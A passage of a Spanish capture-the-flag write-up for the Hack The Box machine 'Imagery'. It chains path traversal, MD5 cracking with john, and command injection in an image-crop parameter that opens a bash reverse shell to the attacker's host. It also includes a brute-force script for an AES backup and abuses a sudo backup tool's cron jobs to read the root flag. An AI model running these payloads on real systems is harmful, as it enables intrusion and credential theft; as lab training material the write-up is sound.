    }
  }'
{"message":"Feature is still in development.","success":false}
```

Si miramos el código anterior con más detenimiento, vemos que requiere una cuenta con `is_testuser_account: true`.

El fichero `config.py` nos revela la existencia de un archivo que actua como base de datos, `db.json`:

```bash
curl 'http://10.10.11.88:8000/admin/get_system_log?log_identifier=../db.json' -b 'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aRXJOA.RvuydKj7dd58II2iYbG_TPhfkYQ'

{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        }
    ],
    "images": [
        {
            "id": "70dffc59-e50d-4fbc-9833-90c5454eab3d",
            "filename": "e696b9ed-408d-489c-8332-942810134e75_hola.gif",
            "url": "/uploads/e696b9ed-408d-489c-8332-942810134e75_hola.gif",
            "title": "test",
            "description": "no description provided",
            "timestamp": "2025-11-13T14:09:38.291626",
            "uploadedBy": "admin@imagery.htb",
            "uploadedByDisplayId": "a1b2c3d4",
            "group": "Unsorted",
            "type": "original",
            "actual_mimetype": "image/gif"
        }
    ],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ],
    "bug_reports": []
}%                              
```

**Acabamos de obtener las credenciales de un usuario con el rol `isTestuser:true`**. 

La contraseña `2c65c8d7bfbca32a3ed42596192384f6` es un hash MD5, vamos a crackearla con **john** y el diccionario **rockyou.txt**:

```bash
john --format=raw-md5 hash.txt --wordlist=/home/abra/Documentos/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=16
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
iambatman        (test)     
1g 0:00:00:00 DONE (2025-11-13 14:20) 33.33g/s 8108Kp/s 8108Kc/s 8108KC/s ilovecs..howard05
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

Iniciamos sesión con las credenciales `testuser@imagery.htb:iambatman` en el sitio web, nos pillamos la cookie del navegador y probamos nuevamente a explotar la vulnerabilidad:

Subimos una imagen cualquiera con las cookies del testuser:

```bash
curl -X POST http://10.10.11.88:8000/upload_image \
  -F "file=@hola.gif" \
  -F "title=test" \
  -b "session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aRXpPw.55otW15664aVWWX3Ab3kn_CifHk"
  
{"imageId":"1bef5eca-a60a-45a1-a6e5-9a66dfe330da","message":"Image uploaded successfully!","success":true}
```

Ahora con el **imageId** obtenido tratamos de explotar la vulnerabilidad de la función `apply_visual_transform()` del archivo `api_edit.py`, con el usuario **testuser**, creando un archivo `/tmp/pwned.txt` que ejecutará el comando **whoami** al ser leído con el LFI del usuario administrador después:

```bash
curl -X POST http://10.10.11.88:8000/apply_visual_transform \
  -H "Content-Type: application/json" \
  -b "session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aRXpPw.55otW15664aVWWX3Ab3kn_CifHk" \
  -d '{
    "imageId": "1bef5eca-a60a-45a1-a6e5-9a66dfe330da",
    "transformType": "crop",
    "params": {
      "x": "0; whoami > /tmp/pwned.txt #",
      "y": "0",
      "width": "100", 
      "height": "100"
    }
  }'
  
{"message":"Image transformed successfully!","newImageId":"c4321688-94ae-4896-a24c-8deaadd060f0","newImageUrl":"/uploads/admin/transformed/transformed_fc575bd5-873e-47c6-a907-af3510ac8e16.gif","success":true}
```

Para terminar de explotar la vulnerabilidad apuntamos con las cookies del administrador a `/tmp/pwned.txt`:

```bash
curl 'http://10.10.11.88:8000/admin/get_system_log?log_identifier=../../../../tmp/pwned.txt' -b 'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aRXJOA.RvuydKj7dd58II2iYbG_TPhfkYQ'

web
```

---
### 5. Reverse shell y escalada a usuario mark

Hemos explotado la vulnerabilidad correctamente, ahora creamos el archivo pero en vez de ejecutar whoami **voy a enviar una reverse shell a mi equipo de atacante**:

Subo nuevamente la imagen válida sin modificar con testuser:

```bash
curl -X POST http://10.10.11.88:8000/upload_image \
  -F "file=@hola.gif" \
  -F "title=test" \
  -b "session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aRXpPw.55otW15664aVWWX3Ab3kn_CifHk"
{"imageId":"bc72be3e-68b6-49d8-9fa4-35230adf5534","message":"Image uploaded successfully!","success":true}
```

Con el **imageId**, nuevamente como **testuser** voy a modificar la imagen, creando un archivo /tmp/reverse.txt que mandara la reverse shell **nada más ejecutemos el siguiente payload**, a mi máquina en escucha por el puerto 4444:

```bash
curl -X POST http://10.10.11.88:8000/apply_visual_transform \
  -H "Content-Type: application/json" \
  -b "session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aRXpPw.55otW15664aVWWX3Ab3kn_CifHk" \
  -d '{
    "imageId": "bc72be3e-68b6-49d8-9fa4-35230adf5534",
    "transformType": "crop",
    "params": {
      "x": "0; echo \"test\" > /tmp/reverse.txt && bash -c \"bash -i >& /dev/tcp/10.10.14.209/4444 0>&1\" #",
      "y": "0",
      "width": "100", 
      "height": "100"
    }
  }'
```

Vemos que recibimos una tty en nuestra máquina de atacante:

```bash
penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.10.0.100 • 192.168.0.1 • 172.17.0.1 • 10.10.14.209
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from Imagery~10.10.11.88-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /home/web/web/env/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/abra/.penelope/sessions/Imagery~10.10.11.88-Linux-x86_64/2025_11_13-14_37_03-449.log 📜
────────────────────────────────────────────────────────────────────────────────────
web@Imagery:~/web$ whoami
web
web@Imagery:~/web$ ls
api_admin.py  api_manage.py  app.py     db.json      static       uploads
api_auth.py   api_misc.py    bot        env          system_logs  utils.py
api_edit.py   api_upload.py  config.py  __pycache__  templates
```

Listo, ya estamos dentro de la máquina, aunque todavía no disponemos de la user flag. Toca **escalar privilegios**. 

El usuario **web** no tiene permisos sudo de ningún tipo. En su home está los archivos relacionados al sitio web únicamente.

En **/var/backup** hay un fichero **`/var/backup/web_20250806_120723.zip.aes`**:

```bash
find / -name "*.aes" 2>/dev/null
/var/backup/web_20250806_120723.zip.aes
```

Abriremos en la máquina víctima un server Python (`python3 -m http.server 3000`) y con wget en nuestra máquina nos lo traemos.

Ejecutando **file** veo lo siguiente:

```bash
file web_20250806_120723.zip.aes
web_20250806_120723.zip.aes: AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"
```

Esta generado el archivo con **pyAesCrypt**, por lo que con ese mismo módulo de python desencriptaré los archivos:

Instalamos el módulo si no lo tenemos:

```bash
pip3 install pyAesCrypt --target=.
```

Usaremos el siguiente script para crackear la contraseña del archivo:

```python
import pyAesCrypt
import os
import time

def brute_force_aes_rockyou(encrypted_file, output_dir, password_file, start_line=0):
    """
    Intenta descifrar un archivo .aes usando rockyou.txt
    
    Args:
        encrypted_file (str): Ruta al archivo .aes cifrado
        output_dir (str): Directorio para el archivo descifrado
        password_file (str): Ruta a rockyou.txt
        start_line (int): Línea desde donde comenzar (útil para reanudar)
    """
    
    # Configuración
    bufferSize = 64 * 1024
    encrypted_file_name = os.path.basename(encrypted_file)
    base_name = os.path.splitext(encrypted_file_name)[0]
    output_file = os.path.join(output_dir, base_name + "_decrypted.zip")
    
    # Estadísticas
    attempts = 0
    start_time = time.time()
    
    print(f"[+] Iniciando ataque con rockyou.txt")
    print(f"[+] Archivo: {encrypted_file}")
    print(f"[+] Contraseñas: {password_file}")
    print(f"[+] Comenzando desde línea: {start_line}")
    print("-" * 50)
    
    try:
        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
            # Saltar líneas si se especifica start_line
            for _ in range(start_line):
                next(f, None)
            
            for password in f:
                password = password.strip()
                attempts += 1
                
                if not password:
                    continue
                
                # Mostrar progreso cada 1000 intentos
                if attempts % 1000 == 0:
                    elapsed = time.time() - start_time
                    rate = attempts / elapsed if elapsed > 0 else 0
                    print(f"[+] Probadas {attempts} contraseñas... ({rate:.1f} p/s)")
                
                try:
                    # Intentar descifrar
                    pyAesCrypt.decryptFile(encrypted_file, output_file, password, bufferSize)
                    
                    # ¡Éxito!
                    elapsed = time.time() - start_time
                    print(f"\n" + "="*60)
                    print(f"[+] ¡CONTRASEÑA ENCONTRADA!")
                    print(f"[+] Contraseña: '{password}'")
                    print(f"[+] Intentos: {attempts}")
                    print(f"[+] Tiempo: {elapsed:.2f} segundos")
                    print(f"[+] Archivo: {output_file}")
                    print("="*60)
                    return password, attempts
                    
                except ValueError as e:
                    # Contraseña incorrecta - limpiar archivo de salida si existe
                    if os.path.exists(output_file):
                        os.remove(output_file)
                    continue
                        
                except Exception as e:
                    # Otro error - mostrar y continuar
                    if os.path.exists(output_file):
                        os.remove(output_file)
                    if attempts % 500 == 0:  # Mostrar errores ocasionales
                        print(f"[!] Error con contraseña '{password}': {e}")
                    continue
    
    except KeyboardInterrupt:
        print(f"\n[!] Proceso interrumpido por el usuario")
        print(f"[+] Total de contraseñas probadas: {attempts}")
        print(f"[+] Última contraseña: '{password}'")
        return None, attempts
    except Exception as e:
        print(f"[!] Error leyendo el archivo de contraseñas: {e}")
        return None, attempts
    
    print(f"\n[-] No se encontró la contraseña después de {attempts} intentos")
    return None, attempts

# Ejecutar el ataque
if __name__ == "__main__":
    archivo_cifrado = "/home/abra/htb_machines/Imagery/web_20250806_120723.zip.aes"
    directorio_salida = "/home/abra/htb_machines/Imagery/"
    rockyou_path = "/home/abra/Documentos/rockyou.txt"
    
    # Verificar que existe rockyou.txt
    if not os.path.exists(rockyou_path):
        print(f"Error: No se encuentra {rockyou_path}")
        exit(1)
    
    print("Iniciando ataque de fuerza bruta...")
    password, attempts = brute_force_aes_rockyou(
        archivo_cifrado, 
        directorio_salida, 
        rockyou_path,
        start_line=0  # Cambiar si quieres reanudar desde cierta línea
    )

```

Lo ejecutamos:

```bash
python3 brute_aes.py
Iniciando ataque de fuerza bruta...
[+] Iniciando ataque con rockyou.txt
[+] Archivo: /home/abra/htb_machines/Imagery/web_20250806_120723.zip.aes
[+] Contraseñas: /home/abra/Documentos/rockyou.txt
[+] Comenzando desde línea: 0
--------------------------------------------------

============================================================
[+] ¡CONTRASEÑA ENCONTRADA!
[+] Contraseña: 'bestfriends'
[+] Intentos: 670
[+] Tiempo: 8.92 segundos
[+] Archivo: /home/abra/htb_machines/Imagery/web_20250806_120723.zip_decrypted.zip
============================================================

```

Listo, tenemos la contraseña `bestfriends`. Descomprimimos el zip. El fichero que nos interesa es **web/db.json**:

```bash
❯ cd web
❯ ls
api_admin.py  api_manage.py  app.py     env          templates
api_auth.py   api_misc.py    config.py  __pycache__  utils.py
api_edit.py   api_upload.py  db.json    system_logs
❯ cat db.json
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "displayId": "f8p10uw0",
            "isTestuser": false,
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "displayId": "8utz23o5",
            "isTestuser": true,
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "mark@imagery.htb",
            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "web@imagery.htb",
            "password": "84e3c804cf1fa14306f26f9f3da177e0",
            "displayId": "7be291d4",
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
    ],
    "images": [],
    "bug_reports": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ]
}%
```

**Vemos que en esta copia de seguridad estaba la contraseña del usuario mark**, en el fichero **db.json** del servidor no veíamos esto, solo estaban el administrador y testuser. Esto es MD5, se lo pasamos a **john** para romperlo mediante diccionario:

```bash
john --format=raw-md5 hash.txt --wordlist=/home/abra/Documentos/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=16
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
supersmash       (mark)     
1g 0:00:00:00 DONE (2025-11-13 18:12) 50.00g/s 12969Kp/s 12969Kc/s 12969KC/s swhsco05..sufrir
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

---
### 6. Acceso como mark y análisis de binario charcol

Ejecutamos **su mark** y con la contraseña `supersmash` iniciamos sesión.

```bash
web@Imagery:~/web$ su mark
Password: 
mark@Imagery:/home/web/web$ whoami
mark
```

Con esto ya tenemos la user flag, toca ir a por la root flag.

---

Vemos que el usuario mark tiene privilegios para ejecutar un binario `/usr/local/bin/charcol` con **sudo**:

```bash
mark@Imagery:/home/web/web$ sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

Vamos a ver que hace el binario. 

```bash
mark@Imagery:~$ sudo /usr/local/bin/charcol help
usage: charcol.py [--quiet] [-R] {shell,help} ...

Charcol: A CLI tool to create encrypted backup zip files.

positional arguments:
  {shell,help}          Available commands
    shell               Enter an interactive Charcol shell.
    help                Show help message for Charcol or a specific command.

options:
  --quiet               Suppress all informational output, showing only warnings and errors.
  -R, --reset-password-to-default
                        Reset application password to default (requires system password verification).
```

Es un script de python, no tenemos permisos de lectura para ver su código, solo de ejecución.

Vamos a entrar en la consola interactiva que tiene el script:

```bash
sudo /usr/local/bin/charcol shell
Enter your Charcol master passphrase (used to decrypt stored app password): 

[2025-11-13 18:25:33] [ERROR] Error: Password/master key cannot be empty. Please try again.
[2025-11-13 18:25:33] [WARNING] Master passphrase cannot be empty. 2 retries left.
Enter your Charcol master passphrase (used to decrypt stored app password): 

[2025-11-13 18:25:37] [ERROR] Incorrect master passphrase. 2 retries left. (Error Code: CPD-002)
Enter your Charcol master passphrase (used to decrypt stored app password): 

[2025-11-13 18:25:40] [ERROR] Incorrect master passphrase. 1 retries left. (Error Code: CPD-002)
Enter your Charcol master passphrase (used to decrypt stored app password): 

[2025-11-13 18:25:41] [ERROR] Incorrect master passphrase after multiple attempts. Exiting application. If you forgot your master passphrase, then reset password using charcol -R command for more info do charcol help. (Error Code: CPD-002)
Please submit the log file and the above error details to error@charcol.com if the issue persists.
```

Solicita una contraseña maestra que desconozco, igual **se puede resetear** gracias a los privilegios sudo que tenemos sobre el script:

```bash
sudo /usr/local/bin/charcol -R

Attempting to reset Charcol application password to default.
[2025-11-13 18:26:26] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: 

[2025-11-13 18:26:42] [INFO] System password verified successfully.
Removed existing config file: /root/.charcol/.charcol_config
Charcol application password has been reset to default (no password mode).
Please restart the application for changes to take effect.
```

Me dejó resetearla con la contraseña del usuario mark, ahora puedo usar el programa **sin contraseña alguna**, perfecto. Al ejecutarlo nuevamente le voy a mandar que quiero usar el script en modo sin contraseña:

```bash
mark@Imagery:~$ sudo /usr/local/bin/charcol shell

First time setup: Set your Charcol application password.
Enter '1' to set a new password, or press Enter to use 'no password' mode: 
Are you sure you want to use 'no password' mode? (yes/no): yes
[2025-11-13 18:27:36] [INFO] Default application password choice saved to /root/.charcol/.charcol_config
Using 'no password' mode. This choice has been remembered.
Please restart the application for changes to take effect.
```

---
### 7. Explotación de charcol para lectura de root flag

Ahora podemos ejecutar la consola interactiva del script, con **help** podemos ver todas las acciones disponibles:

```bash
sudo /usr/local/bin/charcol shell

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0

[2025-11-13 18:28:28] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
charcol> help
[2025-11-13 18:28:32] [INFO] 
Charcol Shell Commands:

  Backup & Fetch:
    backup -i <paths...> [-o <output_file>] [-p <file_password>] [-c <level>] [--type <archive_type>] [-e <patterns...>] [--no-timestamp] [-f] [--skip-symlinks] [--ask-password]
      Purpose: Create an encrypted backup archive from specified files/directories.
      Output: File will have a '.aes' extension if encrypted. Defaults to '/var/backup/'.
      Naming: Automatically adds timestamp unless --no-timestamp is used. If no -o, uses input filename as base.
      Permissions: Files created with 664 permissions. Ownership is user:group.
      Encryption:
        - If '--app-password' is set (status 1) and no '-p <file_password>' is given, uses the application password for encryption.
        - If 'no password' mode is set (status 2) and no '-p <file_password>' is given, creates an UNENCRYPTED archive.
      Examples:
        - Encrypted with file-specific password:
          backup -i /home/user/my_docs /var/log/nginx/access.log -o /tmp/web_logs -p <file_password> --verbose --type tar.gz -c 9
        - Encrypted with app password (if status 1):
          backup -i /home/user/example_file.json
        - Unencrypted (if status 2 and no -p):
          backup -i /home/user/example_file.json
        - No timestamp:
          backup -i /home/user/example_file.json --no-timestamp

    fetch <url> [-o <output_file>] [-p <file_password>] [-f] [--ask-password]
      Purpose: Download a file from a URL, encrypt it, and save it.
      Output: File will have a '.aes' extension if encrypted. Defaults to '/var/backup/fetched_file'.
      Permissions: Files created with 664 permissions. Ownership is current user:group.
      Restrictions: Fetching from loopback addresses (e.g., localhost, 127.0.0.1) is blocked.
      Encryption:
        - If '--app-password' is set (status 1) and no '-p <file_password>' is given, uses the application password for encryption.
        - If 'no password' mode is set (status 2) and no '-p <file_password>' is given, creates an UNENCRYPTED file.
      Examples:
        - Encrypted:
          fetch <URL> -o <output_file_path> -p <file_password> --force
        - Unencrypted (if status 2 and no -p):
          fetch <URL> -o <output_file_path>

  Integrity & Extraction:
    list <encrypted_file> [-p <file_password>] [--ask-password]
      Purpose: Decrypt and list contents of an encrypted Charcol archive.
      Note: Requires the correct decryption password.
      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.
      Example:
        list /var/backup/<encrypted_file_name>.zip.aes -p <file_password>

    check <encrypted_file> [-p <file_password>] [--ask-password]
      Purpose: Decrypt and verify the structural integrity of an encrypted Charcol archive.
      Note: Requires the correct decryption password. This checks the archive format, not internal data consistency.
      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.
      Example:
        check /var/backup/<encrypted_file_name>.tar.gz.aes -p <file_password>

    extract <encrypted_file> <output_directory> [-p <file_password>] [--ask-password]
      Purpose: Decrypt an encrypted Charcol archive and extract its contents.
      Note: Requires the correct decryption password.
      Example:
        extract /var/backup/<encrypted_file_name>.zip.aes /tmp/restored_data -p <file_password>

  Automated Jobs (Cron):
    auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
      Purpose: Add a new automated cron job managed by Charcol.
      Verification:
        - If '--app-password' is set (status 1): Requires Charcol application password (via global --app-password flag).
        - If 'no password' mode is set (status 2): Requires system password verification (in interactive shell).
      Security Warning: Charcol does NOT validate the safety of the --command. Use absolute paths.
      Examples:
        - Status 1 (encrypted app password), cron:
          CHARCOL_NON_INTERACTIVE=true charcol --app-password <app_password> auto add \
          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs -p <file_password>" \
          --name "Daily Docs Backup" --log-output <log_file_path>
        - Status 2 (no app password), cron, unencrypted backup:
          CHARCOL_NON_INTERACTIVE=true charcol auto add \
          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
          --name "Daily Docs Backup" --log-output <log_file_path>
        - Status 2 (no app password), interactive:
          auto add --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
          --name "Daily Docs Backup" --log-output <log_file_path>
          (will prompt for system password)

    auto list
      Purpose: List all automated jobs managed by Charcol.
      Example:
        auto list

    auto edit <job_id> [--schedule "<new_schedule>"] [--command "<new_command>"] [--name "<new_name>"] [--log-output <new_log_file>]
      Purpose: Modify an existing Charcol-managed automated job.
      Verification: Same as 'auto add'.
      Example:
        auto edit <job_id> --schedule "30 4 * * *" --name "Updated Backup Job"

    auto delete <job_id>
      Purpose: Remove an automated job managed by Charcol.
      Verification: Same as 'auto add'.
      Example:
        auto delete <job_id>

  Shell & Help:
    shell
      Purpose: Enter this interactive Charcol shell.
      Example:
        shell

    exit
      Purpose: Exit the Charcol shell.
      Example:
        exit

    clear
      Purpose: Clear the interactive shell screen.
      Example:
        clear

    help [command]
      Purpose: Show help for Charcol or a specific command.
      Example:
        help backup

Global Flags (apply to all commands unless overridden):
  --app-password <password>    : Provide the Charcol *application password* directly. Required for 'auto' commands if status 1. Less secure than interactive prompt.
  -p, "--password" <password>    : Provide the *file encryption/decryption password* directly. Overrides application password for file operations. Less secure than --ask-password.
  -v, "--verbose"                : Enable verbose output.
  --quiet                      : Suppress informational output (show only warnings and errors).
  --log-file <path>            : Log all output to a specified file.
  --dry-run                    : Simulate actions without actual file changes (for 'backup' and 'fetch').
  --ask-password               : Prompt for the *file encryption/decryption password* securely. Overrides -p and application password for file operations.
  --no-banner                   : Do not display the ASCII banner.
  -R, "--reset-password-to-default"  : Reset application password to default (requires system password verification).
```

Veo que es un script que me deja hacer backups de archivos. **Lo estamos ejecutando con sudo, por lo que podemos hacer un backup de /root/root.txt y listo**.

Ejecutamos:

```bash
backup -i /root/root.txt -o /home/mark/root_backup --no-timestamp
```

Resultado:

```bash
charcol> backup -i /root/root.txt -o /home/mark/root_backup --no-timestamp
[2025-11-13 18:31:04] [INFO] No encryption password provided and application is in 'no password' mode. Creating unencrypted archive.
[2025-11-13 18:31:04] [INFO] Output file will be: /home/mark/root_backup.zip
[2025-11-13 18:31:04] [INFO] Creating temporary archive: /home/mark/root_backup.zip of type zip...
[2025-11-13 18:31:04] [ERROR] Blocking access to path '/root/root.txt' as it is within or is a critical directory '/root'
[2025-11-13 18:31:04] [ERROR] Operation aborted: Input path '/root/root.txt' is a blocked critical system location. Skipping this path.
[2025-11-13 18:31:04] [INFO] Temporary archive created successfully at /home/mark/root_backup.zip
[2025-11-13 18:31:04] [INFO] Set permissions for temporary archive file to 0o664
[2025-11-13 18:31:04] [INFO] Set ownership for temporary archive file to root:root
[2025-11-13 18:31:04] [INFO] Moving unencrypted archive to final destination: /home/mark/root_backup.zip...
[2025-11-13 18:31:04] [INFO] Unencrypted backup saved to: /home/mark/root_backup.zip
[2025-11-13 18:31:04] [INFO] Set permissions for final output file to 0o664
[2025-11-13 18:31:04] [INFO] Set ownership for final output file to root:root
[2025-11-13 18:31:04] [INFO] Cleaned up temporary archive file: /home/mark/root_backup.zip
```

Me bloquea la acción al estar tratando de hacer backup de un archivo que está en una ruta crítica. Veo que **también podemos programar tareas cron**, como estamos ejecutando el binario con sudo debería funcionar si tratamos de que se copie la root flag con esa tarea al home de mark:

```bash
auto add --schedule "* * * * *" --command "charcol backup -i /root/root.txt -o /home/mark/root_cron_backup --no-timestamp" --name "Root Backup" --log-output /home/mark/cron_log.txt
```

```bash
charcol> auto add --schedule "* * * * *" --command "charcol backup -i /root/root.txt -o /home/mark/root_cron_backup --no-timestamp" --name "Root Backup" --log-output /home/mark/cron_log.txt
[2025-11-13 18:38:30] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: 

[2025-11-13 18:38:49] [INFO] System password verified successfully.
[2025-11-13 18:38:49] [INFO] Auto job 'Root Backup' (ID: 219311f0-111f-44ee-bcb0-29f6cc6338fc) added successfully. The job will run according to schedule.
[2025-11-13 18:38:49] [INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true charcol backup -i /root/root.txt -o /home/mark/root_cron_backup --no-timestamp >> /home/mark/cron_log.txt 2>&1
```

Esta acción vemos que no funciona tampoco ya que nos bloquea el directorio **/root**:

```bash
mark@Imagery:~$ ls
cron_log.txt  user.txt
mark@Imagery:~$ cat cron_log.txt 
[2025-11-13 18:39:01] [ERROR] Blocking access to path '/root/root.txt' as it is within or is a critical directory '/root'
[2025-11-13 18:39:01] [ERROR] Operation aborted: Input path '/root/root.txt' is a blocked critical system location. Skipping this path.

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0

[2025-11-13 18:39:01] [INFO] No encryption password provided and application is in 'no password' mode. Creating unencrypted archive.
[2025-11-13 18:39:01] [INFO] Output file will be: /home/mark/root_cron_backup.zip
[2025-11-13 18:39:01] [INFO] Creating temporary archive: /home/mark/root_cron_backup.zip of type zip...
[2025-11-13 18:39:01] [INFO] Temporary archive created successfully at /home/mark/root_cron_backup.zip
[2025-11-13 18:39:01] [INFO] Set permissions for temporary archive file to 0o664
[2025-11-13 18:39:01] [INFO] Set ownership for temporary archive file to root:root
[2025-11-13 18:39:01] [INFO] Moving unencrypted archive to final destination: /home/mark/root_cron_backup.zip...
[2025-11-13 18:39:01] [INFO] Unencrypted backup saved to: /home/mark/root_cron_backup.zip
[2025-11-13 18:39:01] [INFO] Set permissions for final output file to 0o664
[2025-11-13 18:39:01] [INFO] Set ownership for final output file to root:root
[2025-11-13 18:39:01] [INFO] Cleaned up temporary archive file: /home/mark/root_cron_backup.zip
```

Esto tiene fácil solución, **usaremos comandos del propio sistema para programar la tarea cron**:

```bash
auto add --schedule "* * * * *" --command "cp /root/root.txt /home/mark/root_direct.txt 2>/dev/null || true" --name "Direct Copy"
```

Con eso **se copia la flag de root al home de mark**:

```bash
mark@Imagery:~$ ls -l
total 24
-rw-r--r-- 1 root root 14832 Nov 13 18:44 cron_log.txt
-rw-r----- 1 root root    33 Nov 13 18:45 root_direct.txt
-rw-r----- 1 root mark    33 Nov 13 18:12 user.txt
```

Ahora bien, no tenemos permisos para leer la flag, vamos a añadir la misma tarea, **pero agregando que ejecute `chmod 644`**:

```bash
auto add --schedule "* * * * *" --command "cp /root/root.txt /home/mark/root_direct.txt && chmod 644 /home/mark/root_direct.txt" --name "Copy with Perms" --log-output /home/mark/cron_perms.log
```

**Ahora si podemos leer la root flag:**

```bash
mark@Imagery:~$ ls -l
total 24
-rw-r--r-- 1 root root 14832 Nov 13 18:44 cron_log.txt
-rw-r--r-- 1 root root     0 Nov 13 18:49 cron_perms.log
-rw-r--r-- 1 root root    33 Nov 13 18:49 root_direct.txt
-rw-r----- 1 root mark    33 Nov 13 18:12 user.txt
```

Con esto hemos vulnerado completamente la máquina.